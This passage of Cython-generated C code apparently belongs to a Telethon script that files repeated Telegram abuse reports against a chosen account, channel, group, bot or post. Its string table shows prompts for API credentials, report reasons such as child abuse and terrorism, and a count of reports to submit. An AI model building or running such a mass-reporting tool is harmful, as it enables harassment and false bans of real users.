#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\
    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\
               __Pyx_GetItemInt_Generic(o, to_py_func(i))))
#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,
                                                     int is_list, int wraparound, int boundscheck);

/* FetchCommonType.proto */
static PyTypeObject* __Pyx_FetchCommonType(PyTypeObject* type);

/* PyErrFetchRestore.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyErr_Clear() __Pyx_ErrRestore(NULL, NULL, NULL)
#define __Pyx_ErrRestoreWithState(type, value, tb)  __Pyx_ErrRestoreInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)    __Pyx_ErrFetchInState(PyThreadState_GET(), type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  __Pyx_ErrRestoreInState(__pyx_tstate, type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)    __Pyx_ErrFetchInState(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb);
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_PyErr_SetNone(exc) (Py_INCREF(exc), __Pyx_ErrRestore((exc), NULL, NULL))
#else
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#endif
#else
#define __Pyx_PyErr_Clear() PyErr_Clear()
#define __Pyx_PyErr_SetNone(exc) PyErr_SetNone(exc)
#define __Pyx_ErrRestoreWithState(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchWithState(type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestoreInState(tstate, type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetchInState(tstate, type, value, tb)  PyErr_Fetch(type, value, tb)
#define __Pyx_ErrRestore(type, value, tb)  PyErr_Restore(type, value, tb)
#define __Pyx_ErrFetch(type, value, tb)  PyErr_Fetch(type, value, tb)
#endif

/* RaiseException.proto */
static void __Pyx_Raise(PyObject *type, PyObject *value, PyObject *tb, PyObject *cause);

/* SwapException.proto */
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_ExceptionSwap(type, value, tb)  __Pyx__ExceptionSwap(__pyx_tstate, type, value, tb)
static CYTHON_INLINE void __Pyx__ExceptionSwap(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb);
#else
static CYTHON_INLINE void __Pyx_ExceptionSwap(PyObject **type, PyObject **value, PyObject **tb);
#endif

/* PyObjectGetMethod.proto */
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method);

/* PyObjectCallMethod1.proto */
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg);

/* CoroutineBase.proto */
typedef PyObject *(*__pyx_coroutine_body_t)(PyObject *, PyThreadState *, PyObject *);
#if CYTHON_USE_EXC_INFO_STACK
#define __Pyx_ExcInfoStruct  _PyErr_StackItem
#else
typedef struct {
    PyObject *exc_type;
    PyObject *exc_value;
    PyObject *exc_traceback;
} __Pyx_ExcInfoStruct;
#endif
typedef struct {
    PyObject_HEAD
    __pyx_coroutine_body_t body;
    PyObject *closure;
    __Pyx_ExcInfoStruct gi_exc_state;
    PyObject *gi_weakreflist;
    PyObject *classobj;
    PyObject *yieldfrom;
    PyObject *gi_name;
    PyObject *gi_qualname;
    PyObject *gi_modulename;
    PyObject *gi_code;
    PyObject *gi_frame;
    int resume_label;
    char is_running;
} __pyx_CoroutineObject;
static __pyx_CoroutineObject *__Pyx__Coroutine_New(
    PyTypeObject *type, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
    PyObject *name, PyObject *qualname, PyObject *module_name);
static __pyx_CoroutineObject *__Pyx__Coroutine_NewInit(
            __pyx_CoroutineObject *gen, __pyx_coroutine_body_t body, PyObject *code, PyObject *closure,
            PyObject *name, PyObject *qualname, PyObject *module_name);
static CYTHON_INLINE void __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *self);
static int __Pyx_Coroutine_clear(PyObject *self);
static PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value);
static PyObject *__Pyx_Coroutine_Close(PyObject *self);
static PyObject *__Pyx_Coroutine_Throw(PyObject *gen, PyObject *args);
#if CYTHON_USE_EXC_INFO_STACK
#define __Pyx_Coroutine_SwapException(self)
#define __Pyx_Coroutine_ResetAndClearException(self)  __Pyx_Coroutine_ExceptionClear(&(self)->gi_exc_state)
#else
#define __Pyx_Coroutine_SwapException(self) {\
    __Pyx_ExceptionSwap(&(self)->gi_exc_state.exc_type, &(self)->gi_exc_state.exc_value, &(self)->gi_exc_state.exc_traceback);\
    __Pyx_Coroutine_ResetFrameBackpointer(&(self)->gi_exc_state);\
    }
#define __Pyx_Coroutine_ResetAndClearException(self) {\
    __Pyx_ExceptionReset((self)->gi_exc_state.exc_type, (self)->gi_exc_state.exc_value, (self)->gi_exc_state.exc_traceback);\
    (self)->gi_exc_state.exc_type = (self)->gi_exc_state.exc_value = (self)->gi_exc_state.exc_traceback = NULL;\
    }
#endif
#if CYTHON_FAST_THREAD_STATE
#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\
    __Pyx_PyGen__FetchStopIterationValue(__pyx_tstate, pvalue)
#else
#define __Pyx_PyGen_FetchStopIterationValue(pvalue)\
    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, pvalue)
#endif
static int __Pyx_PyGen__FetchStopIterationValue(PyThreadState *tstate, PyObject **pvalue);
static CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state);

/* PyObject_GenericGetAttrNoDict.proto */
#if CYTHON_USE_TYPE_SLOTS && CYTHON_USE_PYTYPE_LOOKUP && PY_VERSION_HEX < 0x03070000
static CYTHON_INLINE PyObject* __Pyx_PyObject_GenericGetAttrNoDict(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GenericGetAttrNoDict PyObject_GenericGetAttr
#endif

/* PatchModuleWithCoroutine.proto */
static PyObject* __Pyx_Coroutine_patch_module(PyObject* module, const char* py_code);

/* PatchGeneratorABC.proto */
static int __Pyx_patch_abc(void);

/* Coroutine.proto */
#define __Pyx_Coroutine_USED
static PyTypeObject *__pyx_CoroutineType = 0;
static PyTypeObject *__pyx_CoroutineAwaitType = 0;
#define __Pyx_Coroutine_CheckExact(obj) (Py_TYPE(obj) == __pyx_CoroutineType)
#define __Pyx_Coroutine_Check(obj) __Pyx_Coroutine_CheckExact(obj)
#define __Pyx_CoroutineAwait_CheckExact(obj) (Py_TYPE(obj) == __pyx_CoroutineAwaitType)
#define __Pyx_Coroutine_New(body, code, closure, name, qualname, module_name)\
    __Pyx__Coroutine_New(__pyx_CoroutineType, body, code, closure, name, qualname, module_name)
static int __pyx_Coroutine_init(void);
static PyObject *__Pyx__Coroutine_await(PyObject *coroutine);
typedef struct {
    PyObject_HEAD
    PyObject *coroutine;
} __pyx_CoroutineAwaitObject;
static PyObject *__Pyx_CoroutineAwait_Close(__pyx_CoroutineAwaitObject *self, PyObject *arg);
static PyObject *__Pyx_CoroutineAwait_Throw(__pyx_CoroutineAwaitObject *self, PyObject *args);

/* GetAwaitIter.proto */
static CYTHON_INLINE PyObject *__Pyx_Coroutine_GetAwaitableIter(PyObject *o);
static PyObject *__Pyx__Coroutine_GetAwaitableIter(PyObject *o);

/* CoroutineYieldFrom.proto */
static CYTHON_INLINE PyObject* __Pyx_Coroutine_Yield_From(__pyx_CoroutineObject *gen, PyObject *source);

/* IterFinish.proto */
static CYTHON_INLINE int __Pyx_IterFinish(void);

/* PyObjectCallMethod0.proto */
static PyObject* __Pyx_PyObject_CallMethod0(PyObject* obj, PyObject* method_name);

/* RaiseNeedMoreValuesToUnpack.proto */
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index);

/* RaiseTooManyValuesToUnpack.proto */
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected);

/* UnpackItemEndCheck.proto */
static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected);

/* RaiseNoneIterError.proto */
static CYTHON_INLINE void __Pyx_RaiseNoneNotIterableError(void);

/* UnpackTupleError.proto */
static void __Pyx_UnpackTupleError(PyObject *, Py_ssize_t index);

/* UnpackTuple2.proto */
#define __Pyx_unpack_tuple2(tuple, value1, value2, is_tuple, has_known_size, decref_tuple)\
    (likely(is_tuple || PyTuple_Check(tuple)) ?\
        (likely(has_known_size || PyTuple_GET_SIZE(tuple) == 2) ?\
            __Pyx_unpack_tuple2_exact(tuple, value1, value2, decref_tuple) :\
            (__Pyx_UnpackTupleError(tuple, 2), -1)) :\
        __Pyx_unpack_tuple2_generic(tuple, value1, value2, has_known_size, decref_tuple))
static CYTHON_INLINE int __Pyx_unpack_tuple2_exact(
    PyObject* tuple, PyObject** value1, PyObject** value2, int decref_tuple);
static int __Pyx_unpack_tuple2_generic(
    PyObject* tuple, PyObject** value1, PyObject** value2, int has_known_size, int decref_tuple);

/* dict_iter.proto */
static CYTHON_INLINE PyObject* __Pyx_dict_iterator(PyObject* dict, int is_dict, PyObject* method_name,
                                                   Py_ssize_t* p_orig_length, int* p_is_dict);
static CYTHON_INLINE int __Pyx_dict_iter_next(PyObject* dict_or_iter, Py_ssize_t orig_length, Py_ssize_t* ppos,
                                              PyObject** pkey, PyObject** pvalue, PyObject** pitem, int is_dict);

/* ObjectGetItem.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject *__Pyx_PyObject_GetItem(PyObject *obj, PyObject* key);
#else
#define __Pyx_PyObject_GetItem(obj, key)  PyObject_GetItem(obj, key)
#endif

/* PyIntBinop.proto */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check);
#else
#define __Pyx_PyInt_AddObjC(op1, op2, intval, inplace, zerodivision_check)\
    (inplace ? PyNumber_InPlaceAdd(op1, op2) : PyNumber_Add(op1, op2))
#endif

/* Import.proto */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level);

/* ImportFrom.proto */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name);

/* CythonFunctionShared.proto */
#define __Pyx_CyFunction_USED 1
#define __Pyx_CYFUNCTION_STATICMETHOD  0x01
#define __Pyx_CYFUNCTION_CLASSMETHOD   0x02
#define __Pyx_CYFUNCTION_CCLASS        0x04
#define __Pyx_CyFunction_GetClosure(f)\
    (((__pyx_CyFunctionObject *) (f))->func_closure)
#define __Pyx_CyFunction_GetClassObj(f)\
    (((__pyx_CyFunctionObject *) (f))->func_classobj)
#define __Pyx_CyFunction_Defaults(type, f)\
    ((type *)(((__pyx_CyFunctionObject *) (f))->defaults))
#define __Pyx_CyFunction_SetDefaultsGetter(f, g)\
    ((__pyx_CyFunctionObject *) (f))->defaults_getter = (g)
typedef struct {
    PyCFunctionObject func;
#if PY_VERSION_HEX < 0x030500A0
    PyObject *func_weakreflist;
#endif
    PyObject *func_dict;
    PyObject *func_name;
    PyObject *func_qualname;
    PyObject *func_doc;
    PyObject *func_globals;
    PyObject *func_code;
    PyObject *func_closure;
    PyObject *func_classobj;
    void *defaults;
    int defaults_pyobjects;
    size_t defaults_size;  // used by FusedFunction for copying defaults
    int flags;
    PyObject *defaults_tuple;
    PyObject *defaults_kwdict;
    PyObject *(*defaults_getter)(PyObject *);
    PyObject *func_annotations;
} __pyx_CyFunctionObject;
static PyTypeObject *__pyx_CyFunctionType = 0;
#define __Pyx_CyFunction_Check(obj)  (__Pyx_TypeCheck(obj, __pyx_CyFunctionType))
static PyObject *__Pyx_CyFunction_Init(__pyx_CyFunctionObject* op, PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *self,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);
static CYTHON_INLINE void *__Pyx_CyFunction_InitDefaults(PyObject *m,
                                                         size_t size,
                                                         int pyobjects);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsTuple(PyObject *m,
                                                            PyObject *tuple);
static CYTHON_INLINE void __Pyx_CyFunction_SetDefaultsKwDict(PyObject *m,
                                                             PyObject *dict);
static CYTHON_INLINE void __Pyx_CyFunction_SetAnnotationsDict(PyObject *m,
                                                              PyObject *dict);
static int __pyx_CyFunction_init(void);

/* CythonFunction.proto */
static PyObject *__Pyx_CyFunction_New(PyMethodDef *ml,
                                      int flags, PyObject* qualname,
                                      PyObject *closure,
                                      PyObject *module, PyObject *globals,
                                      PyObject* code);

/* CLineInTraceback.proto */
#ifdef CYTHON_CLINE_IN_TRACEBACK
#define __Pyx_CLineForTraceback(tstate, c_line)  (((CYTHON_CLINE_IN_TRACEBACK)) ? c_line : 0)
#else
static int __Pyx_CLineForTraceback(PyThreadState *tstate, int c_line);
#endif

/* CodeObjectCache.proto */
typedef struct {
    PyCodeObject* code_object;
    int code_line;
} __Pyx_CodeObjectCacheEntry;
struct __Pyx_CodeObjectCache {
    int count;
    int max_count;
    __Pyx_CodeObjectCacheEntry* entries;
};
static struct __Pyx_CodeObjectCache __pyx_code_cache = {0,0,NULL};
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line);
static PyCodeObject *__pyx_find_code_object(int code_line);
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object);

/* AddTraceback.proto */
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename);

/* GCCDiagnostics.proto */
#if defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 6))
#define __Pyx_HAS_GCC_DIAGNOSTIC
#endif

/* CIntToPy.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value);

/* CIntFromPy.proto */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *);

/* CIntFromPy.proto */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *);

/* FastTypeChecks.proto */
#if CYTHON_COMPILING_IN_CPYTHON
#define __Pyx_TypeCheck(obj, type) __Pyx_IsSubtype(Py_TYPE(obj), (PyTypeObject *)type)
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject *type);
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *type1, PyObject *type2);
#else
#define __Pyx_TypeCheck(obj, type) PyObject_TypeCheck(obj, (PyTypeObject *)type)
#define __Pyx_PyErr_GivenExceptionMatches(err, type) PyErr_GivenExceptionMatches(err, type)
#define __Pyx_PyErr_GivenExceptionMatches2(err, type1, type2) (PyErr_GivenExceptionMatches(err, type1) || PyErr_GivenExceptionMatches(err, type2))
#endif
#define __Pyx_PyException_Check(obj) __Pyx_TypeCheck(obj, PyExc_Exception)

/* CheckBinaryVersion.proto */
static int __Pyx_check_binary_version(void);

/* InitStrings.proto */
static int __Pyx_InitStrings(__Pyx_StringTabEntry *t);


/* Module declarations from 'source' */
static PyTypeObject *__pyx_ptype_6source___pyx_scope_struct__report_entity = 0;
#define __Pyx_MODULE_NAME "source"
extern int __pyx_module_is_main_source;
int __pyx_module_is_main_source = 0;

/* Implementation of 'source' */
static PyObject *__pyx_builtin_input;
static PyObject *__pyx_builtin_print;
static PyObject *__pyx_builtin_ValueError;
static PyObject *__pyx_builtin_range;
static const char __pyx_k_e[] = "e";
static const char __pyx_k_i[] = "i";
static const char __pyx_k__2[] = ".";
static const char __pyx_k__10[] = "";
static const char __pyx_k__12[] = "/";
static const char __pyx_k__15[] = ": ";
static const char __pyx_k__19[] = "\n";
static const char __pyx_k__21[] = "@";
static const char __pyx_k__34[] = "_";
static const char __pyx_k_for[] = " for ";
static const char __pyx_k_red[] = "red";
static const char __pyx_k_sys[] = "sys";
static const char __pyx_k_args[] = "args";
static const char __pyx_k_exit[] = "exit";
static const char __pyx_k_home[] = "home";
static const char __pyx_k_keys[] = "keys";
static const char __pyx_k_loop[] = "loop";
static const char __pyx_k_main[] = "__main__";
static const char __pyx_k_name[] = "__name__";
static const char __pyx_k_peer[] = "peer";
static const char __pyx_k_send[] = "send";
static const char __pyx_k_test[] = "__test__";
static const char __pyx_k_time[] = "time";
static const char __pyx_k_Other[] = "Other";
static const char __pyx_k_await[] = "__await__";
static const char __pyx_k_close[] = "close";
static const char __pyx_k_green[] = "green";
static const char __pyx_k_input[] = "input";
static const char __pyx_k_items[] = "items";
static const char __pyx_k_lower[] = "lower";
static const char __pyx_k_parts[] = "parts";
static const char __pyx_k_print[] = "print";
static const char __pyx_k_range[] = "range";
static const char __pyx_k_sleep[] = "sleep";
static const char __pyx_k_split[] = "split";
static const char __pyx_k_start[] = "start";
static const char __pyx_k_throw[] = "throw";
static const char __pyx_k_Report[] = "Report ";
static const char __pyx_k_api_id[] = "api_id";
static const char __pyx_k_client[] = "client";
static const char __pyx_k_entity[] = "entity";
static const char __pyx_k_import[] = "__import__";
static const char __pyx_k_main_2[] = "main";
static const char __pyx_k_number[] = "number";
static const char __pyx_k_prompt[] = "prompt";
static const char __pyx_k_reason[] = "reason";
static const char __pyx_k_source[] = "source";
static const char __pyx_k_Reasons[] = "\nReasons:";
static const char __pyx_k_channel[] = "channel";
static const char __pyx_k_colored[] = "colored";
static const char __pyx_k_isdigit[] = "isdigit";
static const char __pyx_k_message[] = "message";
static const char __pyx_k_replace[] = "replace";
static const char __pyx_k_Report_2[] = "[ Report ";
static const char __pyx_k_Violence[] = "Violence";
static const char __pyx_k_api_hash[] = "api_hash";
static const char __pyx_k_telethon[] = "telethon";
static const char __pyx_k_Copyright[] = "Copyright";
static const char __pyx_k_Terrorism[] = "Terrorism";
static const char __pyx_k_post_link[] = "post_link";
static const char __pyx_k_source_py[] = "source.py";
static const char __pyx_k_submitted[] = " submitted.";
static const char __pyx_k_termcolor[] = "termcolor";
static const char __pyx_k_ValueError[] = "ValueError";
static const char __pyx_k_check_exit[] = "check_exit";
static const char __pyx_k_check_home[] = "check_home";
static const char __pyx_k_disconnect[] = "disconnect";
static const char __pyx_k_get_entity[] = "get_entity";
static const char __pyx_k_https_t_me[] = "https://t.me/";
static const char __pyx_k_message_id[] = "message_id";
static const char __pyx_k_startswith[] = "startswith";
static const char __pyx_k_user_input[] = "user_input";
static const char __pyx_k_Child_abuse[] = "Child abuse";
static const char __pyx_k_input_value[] = "input_value";
static const char __pyx_k_num_reports[] = "num_reports";
static const char __pyx_k_reason_name[] = "reason_name";
static const char __pyx_k_report_type[] = "report_type";
static const char __pyx_k_Enter_Api_Id[] = "Enter Api Id :";
static const char __pyx_k_Reported_for[] = "Reported for ";
static const char __pyx_k_Scam_or_spam[] = "Scam or spam";
static const char __pyx_k_phone_number[] = "phone_number";
static const char __pyx_k_Illegal_goods[] = "Illegal goods";
static const char __pyx_k_Personal_data[] = "Personal data";
static const char __pyx_k_reason_choice[] = "reason_choice";
static const char __pyx_k_report_entity[] = "report_entity";
static const char __pyx_k_valid_options[] = "valid_options";
static const char __pyx_k_Enter_Api_Hash[] = "Enter Api Hash :";
static const char __pyx_k_TelegramClient[] = "TelegramClient";
static const char __pyx_k_report_reasons[] = "report_reasons";
static const char __pyx_k_report_session[] = "report_session";
static const char __pyx_k_I_don_t_like_it[] = "I don't like it";
static const char __pyx_k_entity_username[] = "entity_username";
static const char __pyx_k_get_valid_input[] = "get_valid_input";
static const char __pyx_k_Reported_post_ID[] = "Reported post ID ";
static const char __pyx_k_channel_username[] = "channel_username";
static const char __pyx_k_ReportPeerRequest[] = "ReportPeerRequest";
static const char __pyx_k_telethon_tl_types[] = "telethon.tl.types";
static const char __pyx_k_Exiting_the_script[] = "Exiting the script.";
static const char __pyx_k_cline_in_traceback[] = "cline_in_traceback";
static const char __pyx_k_run_until_complete[] = "run_until_complete";
static const char __pyx_k_Illegal_adult_content[] = "Illegal adult content";
static const char __pyx_k_InputReportReasonFake[] = "InputReportReasonFake";
static const char __pyx_k_InputReportReasonSpam[] = "InputReportReasonSpam";
static const char __pyx_k_InputReportReasonOther[] = "InputReportReasonOther";
static const char __pyx_k_successfully_submitted[] = " successfully submitted. ]";
static const char __pyx_k_Error_retrieving_entity[] = "Error retrieving entity: ";
static const char __pyx_k_What_you_want_to_report[] = "What you want to report: ";
static const char __pyx_k_get_valid_integer_input[] = "get_valid_integer_input";
static const char __pyx_k_InputReportReasonViolence[] = "InputReportReasonViolence";
static const char __pyx_k_How_many_reports_to_submit[] = "How many reports to submit? ";
static const char __pyx_k_InputReportReasonCopyright[] = "InputReportReasonCopyright";
static const char __pyx_k_InputReportReasonChildAbuse[] = "InputReportReasonChildAbuse";
static const char __pyx_k_InputReportReasonPornography[] = "InputReportReasonPornography";
static const char __pyx_k_All_reports_sent_successfully[] = "\nAll reports sent successfully.";
static const char __pyx_k_Enter_Mobile_Number_Eg_9182xx[] = "Enter Mobile Number Eg +9182xx$";
static const char __pyx_k_InputReportReasonIllegalDrugs[] = "InputReportReasonIllegalDrugs";
static const char __pyx_k_telethon_tl_functions_account[] = "telethon.tl.functions.account";
static const char __pyx_k_Enter_the_number_for_the_reason[] = "Enter the number for the reason: ";
static const char __pyx_k_Invalid_post_link_format_Please[] = "Invalid post link format. Please provide a valid link.\n";
static const char __pyx_k_You_can_only_report_a_post_link[] = "You can only report a post link. Please provide a valid link.\n";
static const char __pyx_k_1_Account_2_Channel_3_Group_4_Bo[] = "1: Account\n2: Channel\n3: Group\n4: Bot\n5: Post Link (Channel/Group Only)";
static const char __pyx_k_Enter_the_full_post_link_e_g_htt[] = "Enter the full post link (e.g., https://t.me/channel/12345): ";
static const char __pyx_k_Enter_the_username_or_ID_e_g_use[] = "Enter the username or ID (e.g., @username): ";
static const char __pyx_k_InputReportReasonPersonalDetails[] = "InputReportReasonPersonalDetails";
static const char __pyx_k_Invalid_input_Please_enter_a_num[] = "Invalid input. Please enter a number.";
static const char __pyx_k_Invalid_input_Please_enter_a_val[] = "Invalid input. Please enter a valid integer.";
static const char __pyx_k_Please_select_a_valid_option_fro[] = "Please select a valid option from ";
static PyObject *__pyx_kp_u_1_Account_2_Channel_3_Group_4_Bo;
static PyObject *__pyx_kp_u_All_reports_sent_successfully;
static PyObject *__pyx_kp_u_Child_abuse;
static PyObject *__pyx_n_u_Copyright;
static PyObject *__pyx_kp_u_Enter_Api_Hash;
static PyObject *__pyx_kp_u_Enter_Api_Id;
static PyObject *__pyx_kp_u_Enter_Mobile_Number_Eg_9182xx;
static PyObject *__pyx_kp_u_Enter_the_full_post_link_e_g_htt;
static PyObject *__pyx_kp_u_Enter_the_number_for_the_reason;
static PyObject *__pyx_kp_u_Enter_the_username_or_ID_e_g_use;
static PyObject *__pyx_kp_u_Error_retrieving_entity;
static PyObject *__pyx_kp_u_Exiting_the_script;
static PyObject *__pyx_kp_u_How_many_reports_to_submit;
static PyObject *__pyx_kp_u_I_don_t_like_it;
static PyObject *__pyx_kp_u_Illegal_adult_content;
static PyObject *__pyx_kp_u_Illegal_goods;
static PyObject *__pyx_n_s_InputReportReasonChildAbuse;
static PyObject *__pyx_n_s_InputReportReasonCopyright;
static PyObject *__pyx_n_s_InputReportReasonFake;
static PyObject *__pyx_n_s_InputReportReasonIllegalDrugs;
static PyObject *__pyx_n_s_InputReportReasonOther;
static PyObject *__pyx_n_s_InputReportReasonPersonalDetails;
static PyObject *__pyx_n_s_InputReportReasonPornography;
static PyObject *__pyx_n_s_InputReportReasonSpam;
static PyObject *__pyx_n_s_InputReportReasonViolence;
static PyObject *__pyx_kp_u_Invalid_input_Please_enter_a_num;
static PyObject *__pyx_kp_u_Invalid_input_Please_enter_a_val;
static PyObject *__pyx_kp_u_Invalid_post_link_format_Please;
static PyObject *__pyx_n_u_Other;
static PyObject *__pyx_kp_u_Personal_data;
static PyObject *__pyx_kp_u_Please_select_a_valid_option_fro;
static PyObject *__pyx_kp_u_Reasons;
static PyObject *__pyx_kp_u_Report;
static PyObject *__pyx_n_s_ReportPeerRequest;
static PyObject *__pyx_kp_u_Report_2;
static PyObject *__pyx_kp_u_Reported_for;
static PyObject *__pyx_kp_u_Reported_post_ID;
static PyObject *__pyx_kp_u_Scam_or_spam;
static PyObject *__pyx_n_s_TelegramClient;
static PyObject *__pyx_n_u_Terrorism;
static PyObject *__pyx_n_s_ValueError;
static PyObject *__pyx_n_u_Violence;
static PyObject *__pyx_kp_u_What_you_want_to_report;
static PyObject *__pyx_kp_u_You_can_only_report_a_post_link;
static PyObject *__pyx_kp_u__10;
static PyObject *__pyx_kp_u__12;
static PyObject *__pyx_kp_u__15;
static PyObject *__pyx_kp_u__19;
static PyObject *__pyx_kp_u__2;
static PyObject *__pyx_kp_u__21;
static PyObject *__pyx_n_s__34;
static PyObject *__pyx_n_s_api_hash;
static PyObject *__pyx_n_s_api_id;
static PyObject *__pyx_n_s_args;
static PyObject *__pyx_n_s_await;
static PyObject *__pyx_n_s_channel;
static PyObject *__pyx_n_s_channel_username;
static PyObject *__pyx_n_s_check_exit;
static PyObject *__pyx_n_s_check_home;
static PyObject *__pyx_n_s_client;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_close;
static PyObject *__pyx_n_s_colored;
static PyObject *__pyx_n_s_disconnect;
static PyObject *__pyx_n_s_e;
static PyObject *__pyx_n_s_entity;
static PyObject *__pyx_n_s_entity_username;
static PyObject *__pyx_n_s_exit;
static PyObject *__pyx_n_u_exit;
static PyObject *__pyx_kp_u_for;
static PyObject *__pyx_n_s_get_entity;
static PyObject *__pyx_n_s_get_valid_input;
static PyObject *__pyx_n_s_get_valid_integer_input;
static PyObject *__pyx_n_u_green;
static PyObject *__pyx_n_u_home;
static PyObject *__pyx_kp_u_https_t_me;
static PyObject *__pyx_n_s_i;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_input;
static PyObject *__pyx_n_s_input_value;
static PyObject *__pyx_n_s_isdigit;
static PyObject *__pyx_n_s_items;
static PyObject *__pyx_n_s_keys;
static PyObject *__pyx_n_s_loop;
static PyObject *__pyx_n_s_lower;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_u_main;
static PyObject *__pyx_n_s_main_2;
static PyObject *__pyx_n_s_message;
static PyObject *__pyx_n_s_message_id;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_num_reports;
static PyObject *__pyx_n_s_number;
static PyObject *__pyx_n_s_parts;
static PyObject *__pyx_n_s_peer;
static PyObject *__pyx_n_s_phone_number;
static PyObject *__pyx_n_s_post_link;
static PyObject *__pyx_n_s_print;
static PyObject *__pyx_n_s_prompt;
static PyObject *__pyx_n_s_range;
static PyObject *__pyx_n_s_reason;
static PyObject *__pyx_n_s_reason_choice;
static PyObject *__pyx_n_s_reason_name;
static PyObject *__pyx_n_u_red;
static PyObject *__pyx_n_s_replace;
static PyObject *__pyx_n_s_report_entity;
static PyObject *__pyx_n_s_report_reasons;
static PyObject *__pyx_n_u_report_session;
static PyObject *__pyx_n_s_report_type;
static PyObject *__pyx_n_s_run_until_complete;
static PyObject *__pyx_n_s_send;
static PyObject *__pyx_n_s_sleep;
static PyObject *__pyx_n_s_source;
static PyObject *__pyx_kp_s_source_py;
static PyObject *__pyx_n_s_split;
static PyObject *__pyx_n_s_start;
static PyObject *__pyx_n_s_startswith;
static PyObject *__pyx_kp_u_submitted;
static PyObject *__pyx_kp_u_successfully_submitted;
static PyObject *__pyx_n_s_sys;
static PyObject *__pyx_n_s_telethon;
static PyObject *__pyx_n_s_telethon_tl_functions_account;
static PyObject *__pyx_n_s_telethon_tl_types;
static PyObject *__pyx_n_s_termcolor;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_s_throw;
static PyObject *__pyx_n_s_time;
static PyObject *__pyx_n_s_user_input;
static PyObject *__pyx_n_s_valid_options;
static PyObject *__pyx_pf_6source_check_exit(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_input_value); /* proto */
